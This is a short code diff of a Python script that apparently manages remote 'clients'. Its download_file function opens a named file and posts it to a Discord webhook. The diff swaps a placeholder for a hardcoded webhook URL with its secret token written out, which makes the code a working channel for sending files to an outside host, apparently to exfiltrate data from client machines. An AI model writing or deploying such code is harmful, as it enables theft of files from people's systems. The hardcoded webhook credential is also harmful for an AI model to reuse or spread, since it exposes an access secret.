@@ -37,7 +37,7 @@ def list_clients():
 def download_file(client_ip, filename):
     # Send the file to the Discord webhook
     file_url = f'http://{client_ip}/files/{filename}'  # Assume a valid URL
-    webhook_url = 'your_discord_webhook_url_here'
+    webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
     payload = {'content': f"File: {filename}"}
     files = {'file': open(filename, 'rb')}
     requests.post(webhook_url, data=payload, files=files)
